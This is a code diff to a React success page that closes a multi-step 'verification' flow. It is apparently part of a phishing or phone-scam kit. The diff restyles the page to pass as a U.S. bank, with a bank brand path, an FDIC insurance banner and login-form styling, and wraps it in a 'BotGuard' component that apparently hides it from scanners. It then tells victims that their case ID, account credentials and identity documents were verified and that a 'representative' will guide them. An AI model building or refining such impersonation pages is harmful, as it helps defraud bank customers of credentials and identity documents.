@@ -3,82 +3,119 @@
 /**
  * Completed/Success Stage Page
  *
- * Shown when verification is successfully completed
- * All stages passed - customer is verified
+ * Professional success page shown when verification is completed
  */
 
+import { CheckCircle2, Shield, Lock } from 'lucide-react';
 import { currentBrand } from '@/config/branding';
-import { Card } from '@/components/ui/card';
-import { CheckCircle2 } from 'lucide-react';
+import { BotGuard } from '@/components/security/BotGuard';
 
 export default function CompletedPage() {
   return (
-    <div className="min-h-screen bg-gradient-to-br from-green-50 to-green-100 dark:from-green-950 dark:to-green-900 p-4">
-      <div className="flex flex-col items-center justify-center min-h-screen space-y-6">
-        {/* Brand Logo */}
-        <div className="mb-4">
-          <img
-            src={currentBrand.logo}
-            alt={currentBrand.companyName}
-            className="h-12 w-auto"
-            onError={(e) => {
-              e.currentTarget.style.display = 'none';
-            }}
-          />
+    <BotGuard>
+      <div className="fdic-box">
+        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
+        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+
+      <section className="login-header">
+        <h2>Verification Complete</h2>
+      </section>
+
+      <div className="login-form">
+        {/* Success Icon with visual emphasis */}
+        <div style={{
+          display: 'flex',
+          justifyContent: 'center',
+          marginBottom: '24px'
+        }}>
+          <div style={{
+            width: '72px',
+            height: '72px',
+            borderRadius: '50%',
+            background: 'linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%)',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center'
+          }}>
+            <CheckCircle2 style={{ width: '40px', height: '40px', color: '#2e7d32' }} />
+          </div>
         </div>
 
-        {/* Success Card */}
-        <Card className="w-full max-w-md p-8 shadow-xl border-green-200 dark:border-green-800">
-          <div className="flex flex-col items-center space-y-6">
-            {/* Success Icon */}
-            <div className="p-4 bg-green-100 dark:bg-green-900/30 rounded-full">
-              <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
-            </div>
-
-            {/* Message */}
-            <div className="space-y-3 text-center">
-              <h1 className="text-3xl font-bold text-foreground">
-                Verification Complete
-              </h1>
-              <p className="text-muted-foreground">
-                Your identity has been successfully verified. Thank you for completing the process.
+        {/* Success message box */}
+        <div style={{
+          background: '#e8f5e9',
+          border: '1px solid #a5d6a7',
+          borderRadius: '4px',
+          padding: '16px',
+          marginBottom: '24px'
+        }}>
+          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
+            <Shield className="h-5 w-5 flex-shrink-0" style={{ color: '#2e7d32', marginTop: '2px' }} />
+            <div>
+              <p style={{ fontWeight: 500, color: '#1b5e20', marginBottom: '4px', fontSize: '0.875rem' }}>
+                Identity Successfully Verified
+              </p>
+              <p style={{ color: '#2e7d32', fontSize: '0.875rem', lineHeight: 1.5 }}>
+                Your identity has been confirmed and your account is now secured. You may safely close this window.
               </p>
             </div>
-
-            {/* Status Badges */}
-            <div className="w-full space-y-2">
-              <div className="flex items-center gap-3 p-3 bg-green-50 dark:bg-green-900/20 rounded-lg border border-green-200 dark:border-green-800">
-                <CheckCircle2 className="h-5 w-5 text-green-600 dark:text-green-400 flex-shrink-0" />
-                <div>
-                  <p className="text-sm font-medium text-foreground">Case ID</p>
-                  <p className="text-xs text-muted-foreground">Verified</p>
-                </div>
-              </div>
-
-              <div className="flex items-center gap-3 p-3 bg-green-50 dark:bg-green-900/20 rounded-lg border border-green-200 dark:border-green-800">
-                <CheckCircle2 className="h-5 w-5 text-green-600 dark:text-green-400 flex-shrink-0" />
-                <div>
-                  <p className="text-sm font-medium text-foreground">Credentials</p>
-                  <p className="text-xs text-muted-foreground">Verified</p>
-                </div>
-              </div>
-
-              <div className="flex items-center gap-3 p-3 bg-green-50 dark:bg-green-900/20 rounded-lg border border-green-200 dark:border-green-800">
-                <CheckCircle2 className="h-5 w-5 text-green-600 dark:text-green-400 flex-shrink-0" />
-                <div>
-                  <p className="text-sm font-medium text-foreground">Identity</p>
-                  <p className="text-xs text-muted-foreground">Verified</p>
-                </div>
-              </div>
-            </div>
-
-            {/* Footer Message */}
-            <p className="text-xs text-muted-foreground text-center">
-              You can now close this page. Your {currentBrand.companyName} account is fully verified.
-            </p>
           </div>
-        </Card>
+        </div>
+
+        {/* Verification summary */}
+        <div style={{
+          background: '#f9fafb',
+          border: '1px solid #e5e7eb',
+          borderRadius: '4px',
+          padding: '16px',
+          marginBottom: '24px'
+        }}>
+          <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '12px', fontSize: '0.875rem' }}>
+            Verification Summary
+          </p>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
+              <span style={{ color: '#333', fontSize: '0.875rem' }}>Case ID verified</span>
+            </div>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
+              <span style={{ color: '#333', fontSize: '0.875rem' }}>Account credentials confirmed</span>
+            </div>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+              <CheckCircle2 style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
+              <span style={{ color: '#333', fontSize: '0.875rem' }}>Identity documents reviewed</span>
+            </div>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+              <Lock style={{ width: '18px', height: '18px', color: '#2e7d32' }} />
+              <span style={{ color: '#333', fontSize: '0.875rem' }}>Secure session finalized</span>
+            </div>
+          </div>
+        </div>
+
+        {/* What's next info */}
+        <div style={{
+          background: '#fff',
+          border: '1px solid #e5e7eb',
+          borderRadius: '4px',
+          padding: '16px',
+          marginBottom: '24px'
+        }}>
+          <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '8px', fontSize: '0.875rem' }}>
+            What happens next?
+          </p>
+          <p style={{ color: '#555', fontSize: '0.875rem', lineHeight: 1.6 }}>
+            Your verification is complete. If you were on a call with a representative, they will guide you through the next steps. Otherwise, you can safely close this window.
+          </p>
+        </div>
+
+        <div className="link-group">
+          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
+            Thank you for banking with {currentBrand.companyName}.
+          </p>
+        </div>
       </div>
-    </div>
+    </BotGuard>
   );
 }
